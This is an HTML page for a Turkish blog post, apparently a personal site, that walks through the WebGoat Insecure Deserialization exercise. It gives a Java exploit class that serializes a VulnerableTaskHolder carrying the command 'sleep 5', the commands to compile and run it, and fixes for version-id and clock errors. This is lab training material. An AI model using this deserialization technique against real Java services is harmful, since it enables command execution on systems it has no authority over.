@@ -1,0 +1,396 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+  <link rel="preload" href="/lib/font-awesome/webfonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="/lib/font-awesome/webfonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="/lib/font-awesome/webfonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="/lib/JetBrainsMono/web/woff2/JetBrainsMono-Regular.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title> WebGoat Insecure Deserialization Çözümü | Ceylan Bozoğullarından | Kişisel Web Sayfası</title>
+  <link rel = 'canonical' href = 'http://example.org/2020/01/webgoat-insecure-deserialization-cozumu/'>
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="robots" content="all,follow">
+  <meta name="googlebot" content="index,follow,snippet,archive">
+  <meta property="og:title" content="WebGoat Insecure Deserialization Çözümü" />
+<meta property="og:description" content="“Insecure Deserialization” zafiyeti için araştırma yaparken, WebGoat’ta yer alan problemi çözeyim dedim ancak problem sandığımdan zor çıktı. Beklemediğim birçok problemle karşılaştım. Herhangi bir yerde adam akıllı kaynak da bulamayınca, çözümü buraya kaydetmek istedim. Zafiyetin ne olduğu ile ilgili internette tonla kaynak varken, zafiyetin anlatımı ile ilgili bir benim yazmamın herhalde pek bir katma değeri olmaz. O yüzden direkt karşılaştığım problemlerle birlikte çözümü yazacağım." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://example.org/2020/01/webgoat-insecure-deserialization-cozumu/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2020-01-27T15:48:49+00:00" />
+<meta property="article:modified_time" content="2020-01-27T15:48:49+00:00" /><meta property="og:site_name" content="Ceylan Bozoğullarından | Kişisel Web Sayfası" />
+
+
+  <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="WebGoat Insecure Deserialization Çözümü"/>
+<meta name="twitter:description" content="“Insecure Deserialization” zafiyeti için araştırma yaparken, WebGoat’ta yer alan problemi çözeyim dedim ancak problem sandığımdan zor çıktı. Beklemediğim birçok problemle karşılaştım. Herhangi bir yerde adam akıllı kaynak da bulamayınca, çözümü buraya kaydetmek istedim. Zafiyetin ne olduğu ile ilgili internette tonla kaynak varken, zafiyetin anlatımı ile ilgili bir benim yazmamın herhalde pek bir katma değeri olmaz. O yüzden direkt karşılaştığım problemlerle birlikte çözümü yazacağım."/>
+
+  
+  
+    
+  
+  
+  <link rel="stylesheet" href="http://example.org/css/styles.c05d68261bf086a9d7713c4f8a6215a3601608e267a816a7ee58f139b3d1aae51222aae2081c8e0c6bd35e1334773b7a16283022f31f92afd93bb37e5e822e66.css" integrity="sha512-wF1oJhvwhqnXcTxPimIVo2AWCOJnqBan7ljxObPRquUSIqriCByODGvTXhM0dzt6FigwIvMfkq/ZO7N&#43;XoIuZg==">
+  <link rel="stylesheet" href="http://example.org/css/styles.aa7f4879cac49d951c789d9f35a54627ec2d3da6b0f6b1a638d54cd60a3b1d4d827cc0a737e071cbe211e5813758ffcd847cd7fc33aea5573917e1718700e955.css" integrity="sha512-qn9IecrEnZUceJ2fNaVGJ&#43;wtPaaw9rGmONVM1go7HU2CfMCnN&#43;Bxy&#43;IR5YE3WP/NhHzX/DOupVc5F&#43;FxhwDpVQ=="> 
+
+  
+  
+  
+    <!--[if lt IE 9]>
+      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
+      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+    <![endif]-->
+  
+
+  
+<link rel="icon" type="image/png" href="http://example.org/images/favicon.ico" />
+
+  
+  
+  
+  
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+  <div class="content index py4">
+
+  <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;" aria-label="Top of Page"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+        <li><a href="/">Anasayfa</a></li>
+         
+        <li><a href="/posts">Tüm Yazılar</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li>
+          <a class="icon" href=" http://example.org/2019/07/phishhunterai-test-oltalama-saldirilari-icin-chrome-eklentisi/" aria-label="Previous">
+            <i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i>
+          </a>
+        </li>
+        
+        
+        <li>
+          <a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
+            <i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i>
+          </a>
+        </li>
+        <li>
+          <a class="icon" href="#" aria-label="Share">
+            <i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i>
+          </a>
+        </li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Önceki Yazı</span>
+      <span id="i-next" class="info" style="display:none;">Sonraki Yazı</span>
+      <span id="i-top" class="info" style="display:none;">Yukarı Dön</span>
+      <span id="i-share" class="info" style="display:none;">Yazıyı Paylaş</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      
+      <ul>
+  
+  
+    
+  
+  
+  <li>
+    <a class="icon" href="http://www.facebook.com/sharer.php?u=http%3a%2f%2fexample.org%2f2020%2f01%2fwebgoat-insecure-deserialization-cozumu%2f" aria-label="Facebook">
+      <i class="fab fa-facebook " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://twitter.com/share?url=http%3a%2f%2fexample.org%2f2020%2f01%2fwebgoat-insecure-deserialization-cozumu%2f&text=WebGoat%20Insecure%20Deserialization%20%c3%87%c3%b6z%c3%bcm%c3%bc" aria-label="Twitter">
+      <i class="fab fa-twitter " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.linkedin.com/shareArticle?url=http%3a%2f%2fexample.org%2f2020%2f01%2fwebgoat-insecure-deserialization-cozumu%2f&title=WebGoat%20Insecure%20Deserialization%20%c3%87%c3%b6z%c3%bcm%c3%bc" aria-label="Linkedin">
+      <i class="fab fa-linkedin " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http%3a%2f%2fexample.org%2f2020%2f01%2fwebgoat-insecure-deserialization-cozumu%2f&is_video=false&description=WebGoat%20Insecure%20Deserialization%20%c3%87%c3%b6z%c3%bcm%c3%bc" aria-label="Pinterest">
+      <i class="fab fa-pinterest " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="mailto:?subject=WebGoat%20Insecure%20Deserialization%20%c3%87%c3%b6z%c3%bcm%c3%bc&body=Check out this article: http%3a%2f%2fexample.org%2f2020%2f01%2fwebgoat-insecure-deserialization-cozumu%2f" aria-label="Email">
+      <i class="fas fa-envelope " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://getpocket.com/save?url=http%3a%2f%2fexample.org%2f2020%2f01%2fwebgoat-insecure-deserialization-cozumu%2f&title=WebGoat%20Insecure%20Deserialization%20%c3%87%c3%b6z%c3%bcm%c3%bc" aria-label="Pocket">
+      <i class="fab fa-get-pocket " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://reddit.com/submit?url=http%3a%2f%2fexample.org%2f2020%2f01%2fwebgoat-insecure-deserialization-cozumu%2f&title=WebGoat%20Insecure%20Deserialization%20%c3%87%c3%b6z%c3%bcm%c3%bc" aria-label="reddit">
+      <i class="fab fa-reddit " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.tumblr.com/share/link?url=http%3a%2f%2fexample.org%2f2020%2f01%2fwebgoat-insecure-deserialization-cozumu%2f&name=WebGoat%20Insecure%20Deserialization%20%c3%87%c3%b6z%c3%bcm%c3%bc&description=%3cp%3e%e2%80%9cInsecure%20Deserialization%e2%80%9d%20zafiyeti%20i%c3%a7in%20ara%c5%9ft%c4%b1rma%20yaparken%2c%20WebGoat%e2%80%99ta%20yer%20alan%20problemi%20%c3%a7%c3%b6zeyim%20dedim%20ancak%20problem%20sand%c4%b1%c4%9f%c4%b1mdan%20zor%20%c3%a7%c4%b1kt%c4%b1.%20Beklemedi%c4%9fim%20bir%c3%a7ok%20problemle%20kar%c5%9f%c4%b1la%c5%9ft%c4%b1m.%20Herhangi%20bir%20yerde%20adam%20ak%c4%b1ll%c4%b1%20kaynak%20da%20bulamay%c4%b1nca%2c%20%c3%a7%c3%b6z%c3%bcm%c3%bc%20buraya%20kaydetmek%20istedim.%20Zafiyetin%20ne%20oldu%c4%9fu%20ile%20ilgili%20internette%20tonla%20kaynak%20varken%2c%20zafiyetin%20anlat%c4%b1m%c4%b1%20ile%20ilgili%20bir%20benim%20yazmam%c4%b1n%20herhalde%20pek%20bir%20katma%20de%c4%9feri%20olmaz.%20O%20y%c3%bczden%20direkt%20kar%c5%9f%c4%b1la%c5%9ft%c4%b1%c4%9f%c4%b1m%20problemlerle%20birlikte%20%c3%a7%c3%b6z%c3%bcm%c3%bc%20yazaca%c4%9f%c4%b1m.%3c%2fp%3e" aria-label="Tumblr">
+      <i class="fab fa-tumblr " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://news.ycombinator.com/submitlink?u=http%3a%2f%2fexample.org%2f2020%2f01%2fwebgoat-insecure-deserialization-cozumu%2f&t=WebGoat%20Insecure%20Deserialization%20%c3%87%c3%b6z%c3%bcm%c3%bc" aria-label="Hacker News">
+      <i class="fab fa-hacker-news " aria-hidden="true"></i>
+    </a>
+  </li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <nav id="TableOfContents"></nav>
+    </div>
+  </span>
+</div>
+
+
+  <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+    <header>
+      <h1 class="posttitle" itemprop="name headline">
+        WebGoat Insecure Deserialization Çözümü
+      </h1>
+      <div class="meta">
+        
+        <div class="postdate">
+          
+          <time datetime="2020-01-27 15:48:49 &#43;0000 &#43;0000" itemprop="datePublished">2020-01-27</time>
+          
+        </div>
+        
+        
+        <div class="article-read-time">
+          <i class="far fa-clock"></i>
+          
+          2 dakikalık okuma
+        </div>
+        
+        
+        <div class="article-category">
+            <i class="fas fa-archive"></i>
+            
+            
+            <a class="category-link" href="/categories/uncategorized">Uncategorized</a>
+            
+        </div>
+        
+        
+      </div>
+    </header>
+
+  
+    <div class="content" itemprop="articleBody">
+      <p>“Insecure Deserialization” zafiyeti için araştırma yaparken, WebGoat’ta yer alan problemi çözeyim dedim ancak problem sandığımdan zor çıktı. Beklemediğim birçok problemle karşılaştım. Herhangi bir yerde adam akıllı kaynak da bulamayınca, çözümü buraya kaydetmek istedim. Zafiyetin ne olduğu ile ilgili internette tonla kaynak varken, zafiyetin anlatımı ile ilgili bir benim yazmamın herhalde pek bir katma değeri olmaz. O yüzden direkt karşılaştığım problemlerle birlikte çözümü yazacağım.</p>
+<p>Problemde verilen kutucuğa VulnerableTaskHolder sınıfından üretilen nesnenin serialize edilmiş halinin base64 ile şifrelenerek yazılması isteniyor. Ancak ilgili sınıftan nesne üretirken Constructor’ında yer alan “taskAction” değerine “sleep 5” değerinin girilmesi gerekiyor çünkü görev uygulamadan gelecek cevabı 5 saniye geciktirmek.</p>
+<p>Bunun için öncelikle üçüncü adımda verilen VulnerableTaskHolder.java dosyası indirdim. Dosyada “org.dummy.insecure.framework” paketi kullanıldığı için bu dosyayı yeni oluşturduğum “org/dummy/insecure/framework” klasörünün içine taşıdım. Ardından istenilen istismar kodunu oluşturmak üzere aynı klasöre “Exploit.java” dosyası oluşturarak, içine aşağıdaki kodları yazdım.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Java" data-lang="Java"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span style="color:#ff79c6">package</span> org.dummy.insecure.framework<span style="color:#ff79c6">;</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span style="color:#ff79c6">import</span> org.dummy.insecure.framework.VulnerableTaskHolder<span style="color:#ff79c6">;</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span style="color:#ff79c6">import</span> java.io.ByteArrayOutputStream<span style="color:#ff79c6">;</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span style="color:#ff79c6">import</span> java.io.ObjectOutputStream<span style="color:#ff79c6">;</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span style="color:#ff79c6">import</span> java.io.Serializable<span style="color:#ff79c6">;</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span style="color:#ff79c6">import</span> java.io.IOException<span style="color:#ff79c6">;</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span style="color:#ff79c6">import</span> java.util.Base64<span style="color:#ff79c6">;</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">class</span> <span style="color:#50fa7b">Exploit</span> <span style="color:#ff79c6">{</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">static</span> String <span style="color:#50fa7b">toString</span><span style="color:#ff79c6">(</span>Serializable o<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">throws</span> IOException <span style="color:#ff79c6">{</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span>        ByteArrayOutputStream baos <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> ByteArrayOutputStream<span style="color:#ff79c6">();</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span>        ObjectOutputStream oos <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> ObjectOutputStream<span style="color:#ff79c6">(</span> baos <span style="color:#ff79c6">);</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span>        oos<span style="color:#ff79c6">.</span><span style="color:#50fa7b">writeObject</span><span style="color:#ff79c6">(</span> o <span style="color:#ff79c6">);</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span>        oos<span style="color:#ff79c6">.</span><span style="color:#50fa7b">close</span><span style="color:#ff79c6">();</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span>        <span style="color:#ff79c6">return</span> Base64<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getEncoder</span><span style="color:#ff79c6">().</span><span style="color:#50fa7b">encodeToString</span><span style="color:#ff79c6">(</span>baos<span style="color:#ff79c6">.</span><span style="color:#50fa7b">toByteArray</span><span style="color:#ff79c6">());</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span>    <span style="color:#ff79c6">}</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19</span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">static</span> <span style="color:#8be9fd">void</span> <span style="color:#50fa7b">main</span><span style="color:#ff79c6">(</span>String<span style="color:#ff79c6">&amp;</span>#91<span style="color:#ff79c6">;]</span> args<span style="color:#ff79c6">)</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20</span>	    <span style="color:#8be9fd;font-style:italic">throws</span> IOException <span style="color:#ff79c6">{</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21</span>	VulnerableTaskHolder go <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> VulnerableTaskHolder<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;wait&#34;</span><span style="color:#ff79c6">,</span> <span style="color:#f1fa8c">&#34;sleep 5&#34;</span><span style="color:#ff79c6">);</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22</span>	System<span style="color:#ff79c6">.</span><span style="color:#50fa7b">out</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">println</span><span style="color:#ff79c6">(</span>go<span style="color:#ff79c6">.</span><span style="color:#50fa7b">toString</span><span style="color:#ff79c6">());</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23</span>	String encoded <span style="color:#ff79c6">=</span> toString<span style="color:#ff79c6">(</span>go<span style="color:#ff79c6">);</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24</span>        System<span style="color:#ff79c6">.</span><span style="color:#50fa7b">out</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">println</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;The exploit is &#34;</span> <span style="color:#ff79c6">+</span> encoded<span style="color:#ff79c6">);</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25</span>    <span style="color:#ff79c6">}</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26</span><span style="color:#ff79c6">}</span>
+</code></pre></div><p>Kodları derlemek için “org” klasörünün bulunduğu dizinde aşağıdaki komutu çalıştırdım:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span>javac -cp . org/dummy/insecure/framework/*.java
+</code></pre></div><p>Derlenen Exploit sınıfını çalıştırmak için:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span>java -cp . org.dummy.insecure.framework.Exploit
+</code></pre></div><p>Exploit dosyası çalıştığında oluşan çıktıyı kutuya girip denediğimde ipucu içeren aşağıdaki hata ile karşılaştım. Bu hataya göre “serialization id” sunucudaki VulnerableTaskHolder sınıfınınki ile eşleşmiyordu.</p>
+<blockquote>
+<p>The serialization id does not match. Probably the version has been updated. Let’s try again.</p>
+</blockquote>
+<p>Bunun üzerine aşağıda yer alan ikinci ipucunda belirtildiği gibi VulnerableTaskHolder.java dosyasındaki versiyonu bir arttırarak değerini 2’ye yükselttim.</p>
+<blockquote>
+<p>The VulnerableTaskHolder might have been updated on the server with a next version number.</p>
+</blockquote>
+<p>Tekrar derleme işlemini gerçekleştirdikten sonra Exploit’i yeniden çalıştırdım. Bu sefer de nesnenin son 10 dakika içinde üretilmesi gerektiğini belirten aşağıdaki hatayı aldım:</p>
+<blockquote>
+<p>The task is not executable between now and the next ten minutes, so the action will be ignored. Maybe you copied an old solution? Let’s try again.</p>
+</blockquote>
+<p>Uzun uğraşlardan sonra sorunu çözdüm. VulnerableTaskHolder sınıfının özelliklerinden biri olan “requestedExecutionTime” nesnenin üretildiği zamanı üretildiği sistemin zamanına göre tutuyordu. Oysa üzerinde çalıştığım WebGoat ise sistem zamanı bir gün geride olan sanal bir makinede çalışıyordu. Bu nedenle sorunu anlayabilmem epey bir zaman aldı. Bu sorunu da sanal sunucunun zamanını ana makinemin zamanına senkron hale getirerek çözmüş oldum. Elbette başka çözüm yöntemi de vardır bu durumda ama kolay olan bu olduğu için bu yöntemi tercih ettim.</p>
+<p>Zaman problemini de çözdükten sonra WebGoat ‘ı durdurup yeniden başlattım ve Exploit ‘i tekrar çalıştırarak yeni kodu aldım. Sonuç başarılıydı!</p>
+    </div>
+  </article>
+
+  
+  
+
+
+
+
+  
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+          <script type="text/javascript">
+          
+          (function() {
+              
+              
+              
+              
+          
+              var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+              var disqus_shortname = 'bozogullarindan';
+              dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+              (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+          })();
+          </script>
+          <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+          <a href="https://disqus.com/" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+        </div>
+    </div>
+
+  
+
+
+  <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Anasayfa</a></li>
+         
+          <li><a href="/posts">Tüm Yazılar</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <nav id="TableOfContents"></nav>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      
+      <ul>
+  
+  
+    
+  
+  
+  <li>
+    <a class="icon" href="http://www.facebook.com/sharer.php?u=http%3a%2f%2fexample.org%2f2020%2f01%2fwebgoat-insecure-deserialization-cozumu%2f" aria-label="Facebook">
+      <i class="fab fa-facebook fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://twitter.com/share?url=http%3a%2f%2fexample.org%2f2020%2f01%2fwebgoat-insecure-deserialization-cozumu%2f&text=WebGoat%20Insecure%20Deserialization%20%c3%87%c3%b6z%c3%bcm%c3%bc" aria-label="Twitter">
+      <i class="fab fa-twitter fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.linkedin.com/shareArticle?url=http%3a%2f%2fexample.org%2f2020%2f01%2fwebgoat-insecure-deserialization-cozumu%2f&title=WebGoat%20Insecure%20Deserialization%20%c3%87%c3%b6z%c3%bcm%c3%bc" aria-label="Linkedin">
+      <i class="fab fa-linkedin fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http%3a%2f%2fexample.org%2f2020%2f01%2fwebgoat-insecure-deserialization-cozumu%2f&is_video=false&description=WebGoat%20Insecure%20Deserialization%20%c3%87%c3%b6z%c3%bcm%c3%bc" aria-label="Pinterest">
+      <i class="fab fa-pinterest fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="mailto:?subject=WebGoat%20Insecure%20Deserialization%20%c3%87%c3%b6z%c3%bcm%c3%bc&body=Check out this article: http%3a%2f%2fexample.org%2f2020%2f01%2fwebgoat-insecure-deserialization-cozumu%2f" aria-label="Email">
+      <i class="fas fa-envelope fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://getpocket.com/save?url=http%3a%2f%2fexample.org%2f2020%2f01%2fwebgoat-insecure-deserialization-cozumu%2f&title=WebGoat%20Insecure%20Deserialization%20%c3%87%c3%b6z%c3%bcm%c3%bc" aria-label="Pocket">
+      <i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://reddit.com/submit?url=http%3a%2f%2fexample.org%2f2020%2f01%2fwebgoat-insecure-deserialization-cozumu%2f&title=WebGoat%20Insecure%20Deserialization%20%c3%87%c3%b6z%c3%bcm%c3%bc" aria-label="reddit">
+      <i class="fab fa-reddit fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.tumblr.com/share/link?url=http%3a%2f%2fexample.org%2f2020%2f01%2fwebgoat-insecure-deserialization-cozumu%2f&name=WebGoat%20Insecure%20Deserialization%20%c3%87%c3%b6z%c3%bcm%c3%bc&description=%3cp%3e%e2%80%9cInsecure%20Deserialization%e2%80%9d%20zafiyeti%20i%c3%a7in%20ara%c5%9ft%c4%b1rma%20yaparken%2c%20WebGoat%e2%80%99ta%20yer%20alan%20problemi%20%c3%a7%c3%b6zeyim%20dedim%20ancak%20problem%20sand%c4%b1%c4%9f%c4%b1mdan%20zor%20%c3%a7%c4%b1kt%c4%b1.%20Beklemedi%c4%9fim%20bir%c3%a7ok%20problemle%20kar%c5%9f%c4%b1la%c5%9ft%c4%b1m.%20Herhangi%20bir%20yerde%20adam%20ak%c4%b1ll%c4%b1%20kaynak%20da%20bulamay%c4%b1nca%2c%20%c3%a7%c3%b6z%c3%bcm%c3%bc%20buraya%20kaydetmek%20istedim.%20Zafiyetin%20ne%20oldu%c4%9fu%20ile%20ilgili%20internette%20tonla%20kaynak%20varken%2c%20zafiyetin%20anlat%c4%b1m%c4%b1%20ile%20ilgili%20bir%20benim%20yazmam%c4%b1n%20herhalde%20pek%20bir%20katma%20de%c4%9feri%20olmaz.%20O%20y%c3%bczden%20direkt%20kar%c5%9f%c4%b1la%c5%9ft%c4%b1%c4%9f%c4%b1m%20problemlerle%20birlikte%20%c3%a7%c3%b6z%c3%bcm%c3%bc%20yazaca%c4%9f%c4%b1m.%3c%2fp%3e" aria-label="Tumblr">
+      <i class="fab fa-tumblr fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://news.ycombinator.com/submitlink?u=http%3a%2f%2fexample.org%2f2020%2f01%2fwebgoat-insecure-deserialization-cozumu%2f&t=WebGoat%20Insecure%20Deserialization%20%c3%87%c3%b6z%c3%bcm%c3%bc" aria-label="Hacker News">
+      <i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+      
+        <a id="menu-toggle" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;" aria-label="Menu">
+          <i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc-toggle" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;" aria-label="TOC">
+          <i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share-toggle" class="icon" href="#" onclick="$('#share-footer').toggle();return false;" aria-label="Share">
+          <i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
+          <i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+
+  <footer id="footer">
+  <div class="footer-left">
+    Copyright  &copy; 2021  Ceylan Bozoğullarından 
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+        <li><a href="/">Anasayfa</a></li>
+         
+        <li><a href="/posts">Tüm Yazılar</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+
+  </div>
+</body>
+
+<link rel="stylesheet" href=/lib/font-awesome/css/all.min.css>
+<script src=/lib/jquery/jquery.min.js></script>
+<script src=/js/main.js></script>
+<script src=/js/code-copy.js></script>
+
+
+
+</html>
